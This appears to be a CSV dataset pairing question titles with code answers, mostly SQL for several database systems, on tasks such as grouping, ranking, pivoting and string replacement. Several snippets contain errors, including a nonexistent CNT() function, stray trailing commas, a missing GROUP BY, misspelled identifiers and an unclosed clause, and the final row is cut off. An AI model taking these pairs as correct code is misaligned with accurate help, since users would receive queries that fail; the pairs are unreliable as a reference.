,Unnamed: 0,NL,Code
35885,805,Remove double space in phpmyadmin,"update items set description= replace(description,space(2),space(1))
"
11473,56939,Summing multiple columns without specifying column names,"ALTER TABLE MY_TABLE 
ADD QTY_TOTAL AS QTY_1 + QTY_1 + QTY_1 + ...
"
25978,27962,Query to Insert the sum of salaries department wise in a table,"  Update table_name t2 set t2.TOTAL= (select t1.temp  from 
  (select DEPTNO ,sum(SAL) temp from table_name  group by DEPTNO) t1 where 
  t1.DEPTNO=t2.DEPTNO);
"
3595,3798,Rank books with ties,"SELECT * FROM book_ranks CER
INNER JOIN
(SELECT Rank() over (Order by book_score desc  ) 
  -- only difference is here ----------------^^
  as ranc, book_id
  FROM book_ranks
  WHERE Category = 'Fiction'
GROUP BY book_id, book_score 
) Ranker
ON CER.book_id = Ranker.book_id;
"
17418,21823,How to group common parameters when calling the same SQL Server stored procedures multiple times?,"use [MyDatabase]

-- Common parameters for all merge articles
DECLARE @publication sysname
DECLARE @source_owner sysname 
DECLARE @destination_owner sysname
DECLARE @allow_interactive_resolver nvarchar(5)
select @publication=N'MyPub',
       @source_owner=N'TheOwner', 
       @destination_owner=N'TheOwner',
       @allow_interactive_resolver=N'true'

exec sp_addmergearticle @publication=@publication,
                        @source_owner=@source_owner, 
                        @destination_owner=@destination_owner,
                        @allow_interactive_resolver=@allow_interactive_resolver,
                        @article=N'MyTable#1', 
                        @source_object=N'MyTable#1', 

exec sp_addmergearticle @publication=@publication,
                        @source_owner=@source_owner, 
                        @destination_owner=@destination_owner,
                        @allow_interactive_resolver=@allow_interactive_resolver,
                        @article=N'MyTable#2', 
                        @source_object=N'MyTable#2',
"
14317,1629,SQL Database SELECT question,"SELECT a.last_name, a.first_name, CNT(b.gamecount) totalcount 
FROM players a
JOIN (select cnt(*) gamecount, a.playerid
      FROM games  
      WHERE a.tournamentid = 47
      AND (white_player_id = a.playerid OR black_player_id = a.playerid)
      GROUP BY playerid
      ) b 
ON b.playerid = a.playerid
GROUP BY last_name, first_name
ORDER BY totalcount
"
19786,61230,Filtering out null values only if they exist in SQL select,"select id, col1, col2
from (SELECT a.id, a.col1, a.coll2,
             count(b.id) over () as numbs
      FROM tableA a LEFT OUTER JOIN tableB b ON b.col1=a.col1 and b.col2='value'
      WHERE a.id = @id AND a.col2= @arg
     ) ab
where numbs = 0 or b.id is not null;
"
33279,33760,Filter students that have not passed a subject yet,"SELECT `Reg.No`, SubjectCode, SUM(`Pass/Fail` = 'Pass')
FROM results
GROUP  BY `Reg.No`, SubjectCode
HAVING SUM(`Pass/Fail` = 'Pass') = 0;
"
35856,57618,Sql query needs to sort on multiple date columns together,"select top 10 * from core_table
order by
  CASE
      WHEN start_date >= process_date AND start_date >= archive_date 
          THEN  start_date
      WHEN process_date >= archive_date 
          THEN  process_date
      ELSE  archive_date
  END
 DESC
"
14046,73297,How to use If Else in SSRS expression,"=Switch
(
    Fields!VariableValue.Value = 1, ""Pass"",
    Fields!VariableValue.Value = 2, ""Fail"",
    Fields!VariableValue.Value = 3, ""Abort"",
    Fields!VariableValue.Value = 4, ""ByPass"",
    Fields!VariableValue.Value = ""#Error"", ""NA""
    true, Fields!VariableValue.Value
)
"
14743,50534,limiting union result in oracle,"select *
  from ( select
            ...
          union
         select
            ...
       )
 where rownum <= 500
"
32034,9431,SQL Server 2008 R2 Recursive Update Loop,"WITH    FileList
AS
(
    -- Select all the files that have no children
    SELECT   f.FILE_ID 
            ,f.FILE_SIZE
            ,f.PARENT_ID
            ,0 AS CHILD_ID
            ,0 AS Depth
    FROM    FILES f
            LEFT JOIN
            FILES f1 ON f.FILE_ID=f1.PARENT_ID
    WHERE   f1.PARENT_ID IS NULL
    UNION ALL
    -- Then recursively select thrir parents
    SELECT   f.FILE_ID
            ,fl.FILE_SIZE
            ,f.PARENT_ID
            ,fl.FILE_ID
            ,fl.Depth + 1
    FROM    FileList fl
            INNER JOIN
            FILES f ON f.FILE_ID=fl.PARENT_ID
)
-- With this data update the file size with the sum of all leaf nodes
UPDATE  FILES
SET     FILE_SIZE = (SELECT SUM(FILE_SIZE)
                    FROM    FileList fl
                    WHERE   fl.FILE_ID=FILES.FILE_ID
                    GROUP BY    FILE_ID)
"
9876,66049,Oracle Query with null values,"select case when rn = 1 then order_id end order_id,
       item
from   (select order_id,
               item,
               row_number() over (partition by order_id order by item) rn
        from   sales);

  ORDER_ID ITEM                
---------- --------------------
        10 RICE                
           SALT                
           WATER               
        20 ONION               
           TOMATO              
        30 EGG                 
           OIL                 
        40 CHICKEN             
        50 FISH      
"
25607,15621,what is the performance impact on oracle index on float column?,"SQL> create table int_test( int_col number(38,0), fixed_col number(10,3) );

Table created.

SQL> insert into int_test
  2    select level, level/1000
  3      from dual
  4   connect by level <= 1000000;

1000000 rows created.

SQL> select sum(vsize(int_col)) int_col_total_size,
  2         sum(vsize(fixed_col)) fixed_col_total_size
  3    from int_test;

INT_COL_TOTAL_SIZE FIXED_COL_TOTAL_SIZE
------------------ --------------------
           3979802              4797983

SQL> ed
Wrote file afiedt.buf

  1  select count(*) int_larger_than_fixed
  2    from int_test
  3*  where vsize(int_col) > vsize(fixed_col)
SQL> /

INT_LARGER_THAN_FIXED
---------------------
                 8262

SQL> ed
Wrote file afiedt.buf

  1  select count(*) fixed_larger_than_int
  2    from int_test
  3*  where vsize(int_col) < vsize(fixed_col)
SQL> /

FIXED_LARGER_THAN_INT
---------------------
               826443
"
19056,25829,Map 2 columns to 2 rows in 1 column?,"SELECT stuff, sender_id
    , (SELECT name FROM table2 WHERE id = sender_id) AS sender_name
    , recipient_id
    , (SELECT name FROM table2 WHERE id = recipient_id) AS recipient_name
FROM table1;
"
21302,27468,Case statement with grouping,"SELECT TransactionNumber
    ,sum(CASE WHEN TypeId = 1 THEN Amount ELSE 0 END) AS Type1
    ,sum(CASE WHEN TypeId = 2 THEN Amount ELSE 0 END) AS Type2
    ,sum(CASE WHEN TypeId = 3 THEN Amount ELSE 0 END) AS Type3
    ,sum(CASE WHEN TypeId = 4 THEN Amount ELSE 0 END) AS Type4
    ,sum(CASE WHEN TypeId = 5 THEN Amount ELSE 0 END) AS Type5
FROM Transactions group by TransactionNumber;
"
18589,3311,Inserting multiple rows into a table based on another,"INSERT INTO Table2(Version, Form)
SELECT Version, x.v
FROM Table1
INNER JOIN (VALUES (1, 3), (2, 2), (3, 1)) AS x(i, v)
ON IIF(Table1.Indicator = 0, 3, Table1.Indicator) >= x.i
"
30724,34266,Alter Magento product codes in SQL database?,"UPDATE
     Products
SET
    product_code = RIGHT(CONCAT('00000000', product_code), 8)
"
36270,63304,How can I make a condition to evaluate that either two columns dont have null values in BIDS?,"ISNULL(state) || ISNULL(city)
"
3010,65302,PL SQL trigger to insert history record when a column is updated,"CREATE OR REPLACE TRIGGER trigger_name
  AFTER UPDATE ON table_name
  FOR EACH ROW
BEGIN
  IF( UPDATING( 'COLUMN1' ) )
  THEN
    INSERT INTO log_table( column_name, column_value )
      VALUES( 'COLUMN1', :new.column1 );
  END IF;

  IF( UPDATING( 'COLUMN2' ) )
  THEN
    INSERT INTO log_table( column_name, column_value )
      VALUES( 'COLUMN2', :new.column2 );
  END IF;

  <<repeat for all columns>>
END;
"
8228,1831,intersect and topcount and order function in MDX query,"with 
set [Best Cities in CY 2003/2004] as
    filter(
        intersect(
            topcount(
                [Customer].[Customer Geography].[City],
                10,
                (
                    [Measures].[Internet Sales Amount],
                    [Date].[Calendar].[Calendar Year].[CY 2003]
                )
            ),
            topcount(
                [Customer].[Customer Geography].[City],
                10,
                (
                    [Measures].[Internet Sales Amount],
                    [Date].[Calendar].[Calendar Year].[CY 2004]
                )
            )
        ),
        ([Measures].[Internet Sales Amount], [Date].[Calendar].[Calendar Year].[CY 2004])
        /
        ([Measures].[Internet Sales Amount], [Date].[Calendar].[Calendar Year].[CY 2003])
        - 1.0
        < -0.35
    )
Select [Measures].[Internet Sales Amount] on columns,
       [Best Cities in CY 2003/2004] on rows
From [Adventure Works]
Where 
{
    [Date].[Calendar].[Calendar Year].[CY 2003],
    [Date].[Calendar].[Calendar Year].[CY 2004]
}
"
3351,37253,Oracle SQL - calculate avg pay in department and select all above avg,"select name, department, pay, avergePay
from EMPLOYEE
join DEPARTMENT using (department_id)
join (
select department_id, avg(pay) averagePay
from EMPLOYEE
join DEPARTMENT using (department_id)
) temp using (department_id)
"
1882,32861,Case statement COUNT for THEN in (PostgreSQL) 9.3.11,"SELECT  house,
         accession_year,
         COUNT(CASE WHEN accession_year BETWEEN 1601 AND 1700 THEN name END) AS seventeenth,
         COUNT(CASE WHEN accession_year BETWEEN 1701 AND 1800 THEN name END) AS eighteenth,
         COUNT(CASE WHEN accession_year BETWEEN 1801 AND 1900 THEN name END) AS nineteenth,
         COUNT(CASE WHEN accession_year BETWEEN 1901 AND 2000 THEN name END) AS twentieth,
  FROM (
     SELECT house,name,TO_CHAR(accession, 'YYYY' ) AS accession_year
     FROM monarch
     WHERE house IS NOT NULL ) AS t
  GROUP BY house
  ;
"
22777,20924,Need help on this SQL,"select 
isnull(case when charindex(' ',ship,(charindex(' ',ship,1))+1) > 0 
     then substring(ship,1,charindex(' ',ship,1))+space(1)+replace(substring(ship,(charindex(' ',ship,1))+1,((charindex(' ',ship,(charindex(' ',ship,1))+1)) - (charindex(' ',ship,1)))),substring(ship,(charindex(' ',ship,1))+1,((charindex(' ',ship,(charindex(' ',ship,1))+1)) - (charindex(' ',ship,1)))),replicate('*',len(substring(ship,(charindex(' ',ship,1))+1,(charindex(' ',ship,(charindex(' ',ship,1))+1)) - (charindex(' ',ship,1))))))+space(1)+substring(ship,(charindex(' ',ship,(charindex(' ',ship,1))+1)),(len(ship)))
end,ship) ""Replace""
from 
outcomes
"
19276,4830,How do I remove an email domain value and add a new one in a column - mysql," UPDATE mytable
    set myfield = replace (myfield, '@test.comXYZ', 'domain.com')
"
38895,7280,Finding total number of rows of tables across multiple databases,"SELECT SUM(table_rows) FROM INFORMATION_SCHEMA.TABLES
WHERE table_name = 'company'
"
21688,73656,Find records with same data in multiple fields,"SELECT *
FROM
(
  SELECT s.*,
    IIf(s.DeptOne = ""Pack"", 1, 0) AS D1,
    IIf(s.DeptTwo = ""Pack"", 1, 0) AS D2,
    IIf(s.DeptThree = ""Pack"", 1, 0) AS D3,
    IIf(s.DeptFour = ""Pack"", 1, 0) AS D4,
    IIf(s.DeptFive = ""Pack"", 1, 0) AS D5,
    IIf(s.DeptSix = ""Pack"", 1, 0) AS D6,
    IIf(s.DeptSeven = ""Pack"", 1, 0) AS D7,
    IIf(s.DeptEight = ""Pack"", 1, 0) AS D8,
    IIf(s.DeptNine = ""Pack"", 1, 0) AS D9,
    IIf(s.DeptTen = ""Pack"", 1, 0) AS D10,
    IIf(s.DeptEleven = ""Pack"", 1, 0) AS D11,
    IIf(s.DeptTwelve = ""Pack"", 1, 0) AS D12,
    IIf(s.DeptThirteen = ""Pack"", 1, 0) AS D13,
    IIf(s.DeptFourteen = ""Pack"", 1, 0) AS D14,
    IIf(s.DeptFifteen = ""Pack"", 1, 0) AS D15,
    IIf(s.DeptSixteen = ""Pack"", 1, 0) AS D16,
    IIf(s.DeptSeventeen = ""Pack"", 1, 0) AS D17,
    IIf(s.DeptEightteen = ""Pack"", 1, 0) AS D18,
    IIf(s.DeptNineteen = ""Pack"", 1, 0) AS D19,
    IIf(s.DeptTwenty = ""Pack"", 1, 0) AS D20
FROM MyTable s
) m
WHERE (m.D1 + m.D2 + m.D3 + m.D4 + m.D5 + m.D6 + m.D7 + m.D8 + 
       m.D9 + m.D10 + m.D11 + m.D12 + m.D13 + m.D14 + m.D15 + 
       m.D16 + m.D17 + m.D18 + m.D19 + m.D20) > 1
"
35756,19040,Querying item that is NOT EQUAL in the second table,"Select A.Name, A.VAL1 AS VALUEA1, A.VAL2 AS VALUEB1 
From TableA as A, TableB As B
Where A.NAME = B.NAME AND A.VAL2 != B.VAL2
"
22943,59205,MySQL for replace with wildcard,"UPDATE table
SET Configuration = CONCAT(
      SUBSTR(Configuration, 1, LOCATE('<tag>', Configuration)+4),
      NEW_DATA,
      SUBSTR(Configuration, LOCATE('</tag>', Configuration)
    )
"
7367,17116,Combine Multiple Rows into One Row (One Column) when Using SQL,"  DECLARE @MyTable TABLE
  (
     ID     INT,
     NAME   VARCHAR(100),
     NUMBER INT
  )

INSERT INTO @MyTable
VALUES      (24,
             'infill',
             '20'),
            (25,
             'test1',
             '10'),
            (26,
             'test2',
             '30'),
            (27,
             'test5',
             '35'),
            (28,
             'test3',
             '40')

SELECT stuff((SELECT ',' + NAME + ' ' + CONVERT(VARCHAR(100), NUMBER)
              FROM   @MyTable
              WHERE  id IN ( 24, 26, 28 )
              FOR XML PATH('')), 1, 1, '') AS SERVICE 
"
14620,50254,Count value in output with normal rows,"select t.id,t.name,s.step_no,s.step_data,counts.count
from test t 
     join steps s ON t.id = s.testid
     join (select testid, count(*) as count 
           from steps 
           group by testid) counts ON t.id = counts.testid
"
23948,32727,Get single column each row difference in SQL Server (alternative of LEAD function),"WITH    rows AS
        (SELECT  Column1 ,ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) AS rn
         FROM   (
            SELECT 10 Column1 UNION
            SELECT 25 UNION
            SELECT 30 UNION
            SELECT 40
        )M)
SELECT 
--mp.Column1 ,
mc.Column1,
--mc.rn,
--mp.rn,
CAST(mc.Column1 AS float) - CAST(mp.Column1 AS float) EXPECTED_OUTPUT
FROM    rows mc
LEFT JOIN    rows mp
ON   mp.rn = mc.rn - 1;
"
3499,37276,Postgresql nested SELECT,"SELECT
  P.pid,
  G.gid,
  P.val
FROM
  Grid          AS G
INNER JOIN
  Points        AS P
    ON  P.val < g.max_val
    AND P.Val > g.min_val
"
13657,24758,Android SQL Database returns null a String field with data that is really large,"TwitterObjectFactory.getRawJSON(status);
"
8826,35728,Add 0 at beginning in SQL,"SELECT DISTINCT 
     Right('00'+LTRIM(SUBSTRING(CONVERT(varchar, RunDateTime, 100), 13, 2)),2) + 
     ':'
     + Right('00' + SUBSTRING(CONVERT(varchar, RunDateTime, 100), 16, 2),2) + ' '
     + SUBSTRING(CONVERT(varchar, RunDateTime, 100), 18, 2) AS DistinctDate
FROM TestDates
"
16231,55077,Database game messaging schema,"FRIEND  -- The local user's own tag should go in here too.
( user_id
, current_gamer_tag
, last_update_timestamp
)

GAME
( game_id
, game_name  -- No timestamp here because the name doesn't change?
)

MESSAGE
( message_id  -- If you make this a GUID you can use it for synching with the server.
, sending_user_id -- FK to FRIEND
, receiving_user_id -- Also FK to FRIEND
, timestamp 
, content
)
"
15957,11037,MySQL using Inner joins on an alias of a calculated column,"SELECT User.id, 10*10 as distance 
FROM USERS 
INNER JOIN 
( 
    SELECT Location.user_id, 
    min(10 * 10) as mindistance 
    FROM Location 
    GROUP BY Location.user_id 
 ) L ON User.id = Location.user_id AND L.mindistance =10*10
"
28864,65709,How to select multiple results for a single row - MySQL,"   SELECT g.id, g.name, g.desc, GROUP_CONCAT(P.name) AS platforms
    from game g
    JOIN game_platform gp ON gp.game_id = g.id
    JOIN platform P ON gp.platform_id = p.id
    GROUP BY g.id, g.name, g.desc
"
35312,21443,sum two rows in a table,"select companyname, sum(shares) as shares
from companyshares
group by companyname
"
25478,52205,MySql Group by column y and return column with lowest value in column x,"SET @prevMail = '', @rownum=0;
SELECT b.mail, b.time, b.hits 
FROM (
    SELECT  
    a.mail,
    a.time,
    a.hits,
    CASE WHEN @prevMail = a.mail THEN @rownum :=@rownum+1 ELSE @rownum :=1 END AS rowNum,
    @prevMail:=a.mail
    FROM (
        SELECT mail, time, SUM(hits) AS hits
        FROM tablename 
        GROUP BY mail, time
        ORDER BY mail, time, SUM(hits) ASC
    ) AS a
) AS b
WHERE b.rowNum <= 10;
"
34872,36753,SQL: count all tasks that belong to a user inside each project,"SELECT  Projects.ID, Projects.Name, COUNT(Tasks.ProjectID) 
FROM    Projects  
        LEFT JOIN Tasks 
            ON Tasks.ProjectID = Projects.ID AND
                Assignee=1
GROUP   BY Projects.ID;
"
39273,57361,Multiple counts in a single query,"select 
  custsegment,
  count(distinct clid) as UniqCalls,
  count(case when disconnectflag = 'IVR' then 1 else null end) as IvrCalls,
  -- sum(case when disconnectflag = 'IVR' then 1 else 0 end) as IvrCalls,
  count('x') as TotalCalls
from call_log
where enteredon = '16-JUL-13'
group by
  custsegment
"
6803,58842,SQLite scripting with objective C,"NSString *sql = [NSString stringWithFormat:@""SELECT * FROM %@"",self.databaseName];
const char *sqlStatement = [sql UTF8String];
"
24928,21934,For Loop With Object Table?,"for x in (select value(t) v from person_obj_table t where lastName = 'Smith') loop
  dbms_output.put_line(x.v.get_fullName);
end loop;
"
23533,48425,How do you update a field if it is null in MySQL?,"update tablename
set    size = 0
where  size is null;
"
10060,55761,access: how to detect with VBA whether a query is opened?," If SysCmd(acSysCmdGetObjectState, acQuery, ""QueryName"") = acObjStateOpen Then
"
25672,73052,Oracle split text into multiple rows,"WITH yourtable AS    (SELECT REPLACE('aaaaaa. fgdfg.' ||chr(10)||           
                        'bbbbbbbbbbbbbb ccccccccc  ' ||chr(13)|| 
                        'dddddd ddd dddddddddddd,' ||chr(10)||
                        'asdasdasdll  ' ||chr(13)||
                        'sssss '||chr(10),chr(13),chr(10)) AS astr FROM DUAL)
SELECT REGEXP_SUBSTR ( astr, '[^' ||chr(10)||']+', 1, LEVEL) data   FROM yourtable   
CONNECT BY LEVEL <= LENGTH(astr) - LENGTH(REPLACE(astr, chr(10))) + 1
"
23913,3575,Find the lastest qualifying row for each key,"SELECT DISTINCT ON (id_chef)
       id_chantier, id_chef
FROM   tbl
WHERE  date_fin IS NOT NULL
ORDER  BY id_chef, date_deb DESC NULLS LAST;
"
35712,63839,How to replace a substring before and after a specific character in SQL Server?,"declare @TSQL varchar(100)
declare @R varchar(100)
SET @TSQL = 'this is test string [this text may vary] other text'
SET @R = 'MySubstitute'
Select Left(@TSQL,Charindex('[',@TSQL)-1) + @R + RIGHT(@TSQL,Charindex(']',REVERSE(@TSQL))-1)
"
33120,50055,SQL Query over 5 tables,"SELECT c.client_id, c.name, p.product_id, p.product_name, sum(op.quantity) as product_quantity
FROM Clients AS c
JOIN User AS u ON u.client_id = c.client_id
JOIN Orders AS o ON o.user_id = u.user_id
JOIN OrderPos AS op ON op.order_id = o.order_id
JOIN Products AS p ON p.product_id = op.product_id
GROUP BY c.client_id, c.name, p.product_id, p.product_name;
"
16338,49217,directory paths in mySQL,"UPDATE linksUpdates

 SET newTarget = (CASE 

  WHEN hitMissed = '/dir/dir/misLink1'         THEN 'dir/home' 
  WHEN hitMissed = '/dir/dir/misLink2'         THEN 'photos' 
  WHEN hitMissed = '/dir/dir/anotherBadLink'   THEN 'dir/home' 
  END)
 WHERE misdirect IN (
   '/dir/dir/misLink1',
   '/dir/dir/misLink2',
   '/dir/dir/anotherBadLink'
       )
"
11512,75110,SQL select depending on last access date,"ID int NOT NULL,
last_modified datetime NOT NULL
"
26234,44361,PostgreSQL list companies and rank by sales,"SELECT
    ""public"".companies.""name"", 
     rank() OVER (PARTITION BY sales.companies ORDER BY sales.lifetime) As ""Lifetime Rank"",
     rank() OVER (PARTITION BY sales.companies ORDER BY sales.month As ""One Month""

FROM companies LEFT JOIN 
   (
    SELECT
        SUM(grand_total) As Lifetime,
        SUM(CASE WHEN i.month = <the month of report>, grand_total, 0) As Month
    FROM
        invoices i 
    GROUP BY company_id
   ) sales
ON companies.company_id = sales.company_id
"
22199,72217,mysql query with date comparison,"SELECT a.invoiceno,
       a.invoicerefno,
       a.invoicedate,
       c.companyname,
       a.grandtotal,
       a.twempname,
       itemdescription,
       quantity
FROM twsql_twalldata.t_invoicedet a
INNER JOIN twsql_twalldata.t_salesinv_items b ON a.invoiceno=b.invoiceno
INNER JOIN twsql_twalldata.t_customerdet c ON a.customercode=c.customercode
WHERE a.twempname NOT LIKE '%Auto%' AND 
      (itemdescription LIKE '%AMC%' OR itemdescription LIKE '%annual maintenance contract%') AND 
       invoicecancelled=0 AND DATE(a.invoicedate) > DATE('2012-04-01');
"
15069,23211,oracle 11g PLSQL append xml document as child to another xml document,"declare 
  doc DBMS_XMLDOM.DOMDocument;
  root dbms_xmldom.DOMNode;
  toto_node dbms_xmldom.DOMNode;
  v_xml xmltype := xmltype('<a><b>bbbb</b><c>ccccc</c></a>') ;
  childDoc  DBMS_XMLDOM.DOMDocument;
  childDocElement   DBMS_XMLDOM.DOMELEMENT;
begin 
doc := DBMS_XMLDOM.newDOMDocument;

DBMS_XMLDOM.setVersion(doc, '1.0');
DBMS_XMLDOM.setcharset(doc, 'ISO-8859-15');
root := DBMS_XMLDOM.makeNode(doc);
toto_node := DBMS_XMLDOM.appendChild(root, DBMS_XMLDOM.makeNode(DBMS_XMLDOM.createElement(doc, 'toto1')));
childDoc  := DBMS_XMLDOM.NEWDOMDOCUMENT(v_xml);
childDocElement      := DBMS_XMLDOM.getDocumentElement(childDoc);
childDocElement      := DBMS_XMLDOM.makeElement(DBMS_XMLDOM.importNode(doc,DBMS_XMLDOM.makeNode(childDocElement),TRUE));

root := DBMS_XMLDOM.appendChild(toto_node,DBMS_XMLDOM.makeNode(childDocElement));
dbms_output.put_line(DBMS_XMLDOM.GETXMLTYPE(doc).getClobVal());
end; 
"
2246,19338,"WHERE col1,col2 IN (...) [SQL subquery using composite primary key]","sqlite> create table foo (a,b,c);
sqlite> create table bar (x,y);
sqlite> select * from foo where exists (select 1 from bar where foo.a = bar.x and foo.b = bar.y);
"
13811,63693,Oracle SQL Select Statement Calculations,"select 
  task_name, 
  to_char(ses_start, 'DD-MON-RR') DATE,
  to_char(ses_start,'HH:MI PM') START, 
  to_char(ses_end, 'HH:MI PM') END,
  round((ses_end - ses_start) * 24, 2) DURATION_IN_HOUR
...
"
7276,34190,oracle sql - How to I escape the result text,"select replace(field1, '''', '''''') from test
"
8765,43929,how to update syscolumns of a view after alter table - T-SQL?,"create table Test ( n1 decimal(12,4) )
go
create view VTest as Select * from Test;
go
sp_help VTest
go
alter table Test alter column n1 decimal(12,2)
EXEC sp_refreshview  VTest
go
sp_help VTest
"
29726,73726,Select highest season and episode (mysql),"SELECT * FROM tablename WHERE series = 1 ORDER BY season DESC, episode DESC LIMIT 1;
"
39763,18853,"basic sql : selecting the same column multiple times in one query, when each occurrence is dependent on different where clause","SELECT
(SELECT x FROM table WHERE y=1) AS x1,
(SELECT x FROM table WHERE y=2) AS x2,
(SELECT x FROM table WHERE y=3) AS x3
"
25631,4247,How can I order by a date in string format properly?,"SELECT CONVERT(varchar(10), create_date, 101) as 'Date', COUNT(*) as 'Record Count',
FROM the_table
GROUP BY CONVERT(varchar(10), create_date, 101)
ORDER BY MIN(create_date) desc
"
16633,23850,Insert a value/Row in a View,"create view yourview2
as
select 0 as ""Element No"", 'Pie' as Details , 1000 as UniqueID
union all 
select [Element No], Details, UniqueID
from yourview
"
32392,52001,How to check if a trigger is invalid?,"SELECT *
FROM   ALL_OBJECTS
WHERE  OBJECT_NAME = trigger_name
AND    OBJECT_TYPE = 'TRIGGER'
AND    STATUS <> 'VALID'
"
36532,52805,SQL Server: How to use XML input for Update / Set statement,"UPDATE A
SET    title = b.title,
       summary = b.summary,
       post = b.post,
       departmentID = b.departmentID
FROM   LogTable A
       JOIN (SELECT title=[Xml_Tab].[Cols].value('(title)[1]', 'nvarchar(100)'),
                    summary=[Xml_Tab].[Cols].value('(summary)[1]', 'nvarchar(500)'),
                    post=[Xml_Tab].[Cols].value('(post)[1]', 'nvarchar(max)'),
                    departmentID=[Xml_Tab].[Cols].value('(departmentID)[1]', 'int'),
                    PostID=[Xml_Tab].[Cols].value('(postID)[1]', 'int')
             FROM   @xmlMain.nodes('/root') AS [Xml_Tab]([Cols]) ) B
         ON a.postID = b.postID 
"
4816,53552,What host name in different database?,"mysql> show variables like 'hostname';
"
31108,36379,teradata - volatile table,"abort;
 *** ABORT signal received.
 *** Warning: Canceling the rest of the output.
 BTEQ -- Enter your SQL request or BTEQ command:
"
34085,60298,3 table Linq Query,"from pc in ProductCategories
let photo = pc.Products.SelectMany(p => p.Photos).FirstOrDefault()
select new {pc, photo};
"
25955,18270,Can I execute several WHERE LIMIT statements in one query?,"SELECT *
FROM  (
   SELECT *, row_number() OVER (PARTITION BY year ORDER BY total DESC) AS rn
   FROM   tbl
   ) sub
WHERE rn < 4
"
37841,13391,MySql Select data from SubQuery when master query has groupby clause,"select
    mysub.count, 
    nr.`networkid`
from 
    `networks` as nr,

(select 
    count(`ipaddress`) as count,
    `networkid`
from 
    `users`
where 
    `networkid`
in (
    select 
        `networkid`
    from 
        `networks`
   )
group by 
    `networkid`) as mysub
    where nr.`networkid` = mysub.`networkid`
    group by nr.`networkid` 
"
31419,25447,SQL Select Statement Where,"Select * from Event 
Where 
   (
        ((@personId is null) OR (PresenterId =@personId ))
        and 
        ((@personId  is null) OR (AuthorId = @personId))
        AND 
        (@filter = 'PandAOnly' or @filter = 'AllP' or @filter = 'AllA')
    )
OR 
  (
       (PresenterId = @personId 
        Or
        AuthorId = @personId )
    AND (@filter = 'All')
  )
OR 
  (
       PresenterId = @personId 
       and
       AuthorId <> @personId 
       and 
       @fitler = 'POnly'
  )
OR 
 (
        AuthorId = @personId 
        and 
        PresenterId <> @personId 
       and 
       @fitler = 'AOnly'
 )
"
24993,28041,Count(Distinct FieldName) in access query,"select BrandID, sum(orders), sum(models)
from (
    select BrandID, count(OrderID) orders, 0 models
    from (
        select distinct BrandID, OrderID
        from ordertable
        where Trunc(Pur_Date) between '01-Feb-2015' and '09-Feb-2015'
    ) x1
    group by BrandID
    union all
    select BrandID, 0 orders, count(ModelID) models
    from (
        select distinct BrandID, ModelID
        from ordertable
        where Trunc(Pur_Date) between '01-Feb-2015' and '09-Feb-2015'
    ) x2
    group by BrandID
) o
group by BrandID
"
22940,46550,Can we specify degree of parallelism dynamically?,"DECLARE
   degree varchar2(1); 
BEGIN 
   select value-2 
     INTO degree 
     from v$parameter
    where name='cpu_count';              

   EXECUTE IMMEDIATE('INSERT /*+ APPEND PARALLEL (tst, '||degree||') */ '||
                     '  INTO test_table tst ( '||
                     '       **************  '||
                     '       **************  '||
                     '       **************  '||
                     '  ) '||
                     'SELECT /*+  PARALLEL (a, '||degree||') */ '||
                     '       DISTINCT '||
                     '       ************** '||
                     '       ************** '||
                     '       ************** '||
                     '  FROM src_table a');
END; 
"
39354,41867,Sql iteration over XML,"declare @xml xml = 
'<Master>
   <UserIds>
       <id>1</id>
       <id>2</id>
       <id>3</id>
       <id>4</id>
  </UserIds>
</Master>
'

insert into YourTable(ID)
select T.N.value('.', 'int')
from @xml.nodes('/Master/UserIds/id') as T(N)
"
34323,2147,Select count multiple fields within time range - MYSQL,"SELECT
    MIN(date),
    SUM(count),
    SUM(fb_user_count),
    SUM(email_user_count)
FROM visit
GROUP BY WEEK(date, 1); -- First day is Monday

SELECT
    CONCAT(YEAR(date), '-', MONTH(date)),
    SUM(count),
    SUM(fb_user_count),
    SUM(email_user_count)
FROM visit
GROUP BY YEAR(date), MONTH(date);
"
1780,24080,SQL DELETE with JOIN another table on multiple conditions for WHERE NULL,"DELETE s                    -- << HERE: s (alias of slaveTable )
FROM   slaveTable AS s
LEFT JOIN 
       masterTable AS m 
ON   ( s.key1 = m.key1
AND    s.key2 = m.key2 )
WHERE  m.key1 IS NULL
"
8344,12836,How to get data out of a database where the saved date is greater than another date + 1 week,"SELECT * FROM foo WHERE update_date > DATE_ADD(publish_date, INTERVAL 1 WEEK)
"
39262,9959,sql query to select records in a specific format (using pivot or other),"DECLARE @cols AS NVARCHAR(MAX),
    @query  AS NVARCHAR(MAX)

select @cols = STUFF((SELECT distinct ',' + QUOTENAME(Animal2) 
                    from animals
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'')

set @query = 'SELECT Animal1, ' + @cols + ' from 
             (
                select animal1, animal2, Corelation
                from animals
            ) x
            pivot 
            (
                min(Corelation)
                for animal2 in (' + @cols + ')
            ) p '

execute(@query)
"
35921,68553,SQL grouping and running total of open items for a date range,"SELECT COUNT(CASE WHEN d.CheckDate = i.StartDate THEN 1 ELSE NULL END)
         AS ItemsOpened
     , COUNT(i.StartDate)
         AS ItemsOpenedCumulative
FROM Dates AS d
  LEFT JOIN Items AS i
    ON d.CheckDate BETWEEN i.StartDate AND i.EndDate
GROUP BY d.CheckDate
"
27301,56364,Importing data from CSV file in MySQL,"LOAD DATA LOCAL INFILE 'H:/countries.csv' INTO TABLE ListOfCountries
    FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '""'
    LINES TERMINATED BY '\n'
    IGNORE 1 LINES (CountryName, CountryCode);
"
31308,32769,MySQL schema for one table,"// saving a settings value

$max_length = 20;
mysql_query(""UPDATE settings SET value = '{$max_length}' WHERE field = 'max_length'"");

// obtaining a settings value

$result = mysql_query(""SELECT value FROM settings WHERE field = 'max_length'"");
$settings = mysql_fetch_assoc($result);
$max_length = (int) $settings['value'];
"
11360,12481,Counting multiple value occurrences,"select (case when name1 = 'JOE' then name2 else name1 end) as name,
       sum(case when name1 = 'JOE' and winner = 2 then 1
                when name2 = 'JOE' and winner = 1 then 1
                else 0
           end) as wins,
       count(*) as games
from games g
where 'JOE' in (name1, name2)
group by (case when name1 = 'JOE' then name2 else name1 end);
"
20606,55544,SQL INNER JOIN return parent row values only on first match,"SELECT CASE WHEN RowNumber = 1 THEN Dept_id ELSE NULL END AS Dept_id,
       CASE WHEN RowNumber = 1 THEN Dept_name ELSE NULL END AS Dept_name,
        Emp_id, Emp_Name
FROM Dept d
INNER JOIN 
(SELECT ROW_NUMBER() OVER (PARTITION BY Dept_id ORDER BY Emp_Name) AS RowNumber, 
